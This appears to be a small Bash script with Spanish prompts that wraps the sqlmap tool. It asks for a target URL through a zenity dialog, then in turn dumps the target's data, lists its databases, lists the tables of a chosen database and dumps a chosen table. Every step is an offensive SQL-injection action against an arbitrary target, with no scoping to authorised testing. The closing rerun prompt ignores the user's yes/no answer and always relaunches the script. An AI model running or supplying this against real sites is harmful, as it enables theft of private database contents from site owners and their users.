server=$(zenity --entry --title "¿A dónde lanzamos sqlmap hoy? :)" --text "¿A qué URL/IP quieres lanzar sqlmap?") >/dev/null 2>&1
sqlmap -u $server --dump
sleep 5
echo 
echo Vamos a ver las bases de datos...
echo 
echo Pulsa [Enter] para continuar
read o
sqlmap -u $server --dbs
sleep 8
echo Escribe la base de datos para ver sus tablas:
read base
sqlmap -u $server -D $base --tables
sleep 7
echo Escribe la tabla que quieres investigar:
read tabla1
sqlmap -u $server -D $base -T $tabla1 --dump
sleep 8
echo ¿Quieres volver a ejecutar el mismo proceso? Escribe si / no.
read ke
sh=$ke
sh sqlmap.sh

